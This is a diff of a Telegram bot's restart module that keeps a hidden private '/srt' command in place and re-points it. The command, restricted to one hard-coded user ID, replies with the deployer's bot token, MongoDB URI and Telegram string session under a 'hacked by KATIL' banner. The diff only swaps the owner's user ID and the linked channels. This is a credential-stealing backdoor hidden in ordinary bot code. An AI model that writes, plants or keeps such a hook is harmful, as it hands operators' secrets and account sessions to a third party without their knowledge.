@@ -119,17 +119,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("srt")
     & filters.private
-    & filters.user(5604140011)
+    & filters.user(5301800943)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
           photo=f"https://te.legra.ph/file/dc31ab3384c2417e45dee.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 KATIL.\n\n☆............𝙱𝚈 » [亗『𝐊𝐀𝐓𝐈𝐋』亗](https://t.me/tera_baap_katil)............☆""",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 KATIL.\n\n☆............𝙱𝚈 » [亗『𝐊𝐀𝐓𝐈𝐋』亗](https://t.me/katil_your_dad)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву 亗『𝐊𝐀𝐓𝐈𝐋』亗 •", url=f"https://t.me/TERA_BAAP_KATIL")
+                          "• нαϲкє𝚍 ву 亗『𝐊𝐀𝐓𝐈𝐋』亗 •", url=f"https://t.me/katil_your_dad")
                  ]
              ]
          ),
